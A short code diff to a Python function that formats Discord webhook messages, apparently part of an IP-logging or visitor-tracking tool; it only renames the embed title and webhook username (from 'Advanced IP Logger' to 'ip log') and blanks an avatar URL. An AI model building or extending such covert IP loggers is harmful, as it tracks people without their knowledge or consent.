@@ -229,7 +229,7 @@ def format_discord_message(data):
     
     # Create embed
     embed = {
-        "title": "🔍 Advanced Visitor Tracking Report",
+        "title": "Discord User Logger",
         "color": 0x5865F2,
         "fields": fields,
         "footer": {
@@ -241,8 +241,8 @@ def format_discord_message(data):
     }
     
     return {
-        "username": "Advanced IP Logger",
-        "avatar_url": "https://i.imgur.com/J5qKXWq.png",
+        "username": "ip log",
+        "avatar_url": "",
         "embeds": [embed]
     }
 
